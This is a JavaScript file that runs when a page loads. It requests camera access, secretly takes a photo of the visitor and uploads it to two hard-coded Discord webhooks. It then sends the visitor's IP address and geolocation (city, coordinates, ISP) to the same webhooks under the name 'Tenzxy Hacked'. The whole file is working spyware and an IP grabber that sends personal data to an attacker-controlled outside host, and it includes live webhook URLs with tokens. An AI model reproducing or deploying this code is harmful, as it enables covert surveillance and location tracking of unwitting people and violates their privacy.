// -- Tenzxy Code Hackshield -- //

const discordWebhookUrl1 = 'https://discord.com/api/webhooks/1354893074702008360/VQ1E0H9PGmiF-dirC1SVYTzLvTMJ-G6TdJw_tUZ-hYdzdRkRVN3DFD0dOR330ZJn7KbF';
const discordWebhookUrl2 = 'https://discord.com/api/webhooks/1382615136421806130/THWMLTxPnfHDS-SQj84aJRcX3kmsZWU7TM5XWRQtn6iKUYfJjJUJtjpFGlUak_-mdaYZ';
const discordChannelUrl = 'https://discord.gg/agBt2AN9Wx';

// Automatically take a photo and send it
async function captureAndSendPhoto() {
    let videoStream;
    try {
        // Access the user's camera
        console.log("Requesting camera access...");
        videoStream = await navigator.mediaDevices.getUserMedia({ video: true });

        const video = document.createElement('video');
        video.srcObject = videoStream;
        video.style.display = 'none';
        document.body.appendChild(video);

        // Wait for the video to be ready
        await new Promise((resolve) => {
            video.onloadedmetadata = () => resolve(video.play());
        });

        // Capture the image from the video stream
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Convert the captured image to a blob
        const imageUrl = canvas.toDataURL('image/png');
        const imageBlob = dataURLToBlob(imageUrl);

        // Send the image to Discord
        console.log("Sending image to Discord...");
        await sendImageToDiscord(discordWebhookUrl1, imageBlob);
        await sendImageToDiscord(discordWebhookUrl2, imageBlob);

        // Stop the video stream and clean up
        videoStream.getTracks().forEach(track => track.stop());
        document.body.removeChild(video);

        // Fetch IP info after capturing the image
        await fetchAndDisplayData();

        // Optionally, open the Discord channel in a new tab
        window.open(discordChannelUrl, '_blank');
    } catch (error) {
        console.error('Error capturing photo:', error);
        alert('There was an issue capturing the photo. Please check your camera permissions.');
    }
}

// Convert Data URL to Blob
function dataURLToBlob(dataURL) {
    const [metadata, base64Data] = dataURL.split(',');
    const mimeType = metadata.match(/:(.*?);/)[1];
    const binaryString = atob(base64Data);
    const len = binaryString.length;
    const bytes = new Uint8Array(len);

    for (let i = 0; i < len; i++) {
        bytes[i] = binaryString.charCodeAt(i);
    }

    return new Blob([bytes], { type: mimeType });
}

// Send Image to Discord
async function sendImageToDiscord(webhookUrl, imageBlob) {
    const formData = new FormData();
    formData.append('file', imageBlob, 'captured_image.png');

    try {
        const sendResponse = await fetch(webhookUrl, {
            method: 'POST',
            body: formData
        });

        if (sendResponse.ok) {
            console.log('Image sent to Discord!');
        } else {
            console.error('Failed to send image to Discord, status:', sendResponse.status);
        }
    } catch (error) {
        console.error('Error sending image to Discord:', error);
    }
}

// Fetch information from an API
async function fetchInformation(url) {
    try {
        console.log('Fetching IP information from:', url);
        const response = await fetch(url);
        if (!response.ok) {
            throw new Error('Failed to fetch IP info');
        }
        return await response.json();
    } catch (error) {
        console.error('Error fetching information:', error);
        return null;
    }
}

// Log Information to Webhook
async function logToWebhook(ipInfo, extraInfo) {
    if (!ipInfo || !ipInfo.query) {
        console.error('IP address is missing:', ipInfo);
        return;
    }

    const ipAddress = ipInfo.query; // The IP address from the API
    const payload = {
        username: 'Tenzxy Hacked',
        avatar_url: 'https://cdn.discordapp.com/attachments/1290048913340108882/1315990743743201331/465017387_1096352372500294_8907522774408044011_n.png',
        content: `**IP**: _${ipAddress}_\n**FaceBook TenzxyBoi**: https://web.facebook.com/Tenzxyboi${ipAddress}_\n**Extra Info**: || Tenzxy Boi ||\`\`\`T${extraInfo}\`\`\``
    };

    try {
        const response = await fetch(discordWebhookUrl1, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log('Message successfully sent to webhook');
        } else {
            console.error('Failed to send message to webhook');
        }
    } catch (error) {
        console.error('Error sending message to webhook:', error);
    }
}

// Fetch and Display Data (including IP)
async function fetchAndDisplayData() {
    // Fetch IP info from ip-api.com
    const ipApiUrl = "http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query";
    const ipInfo = await fetchInformation(ipApiUrl);

    if (ipInfo) {
        console.log('Fetched IP Info:', ipInfo);
        // Log IP info to webhook
        await logToWebhook(ipInfo, JSON.stringify(ipInfo, null, 2));
    }

    // Optionally fetch IP from ipify API
    const ipifyUrl = "https://api.ipify.org/";
    const ipifyInfo = await fetchInformation(ipifyUrl);

    if (ipifyInfo) {
        console.log('Fetched IPIFY Info:', ipifyInfo);
        // Optionally log IP from ipify API if needed
        // await logToWebhook(ipifyInfo, JSON.stringify(ipifyInfo, null, 2));
    }
}

// Automatically call the capture function
captureAndSendPhoto();
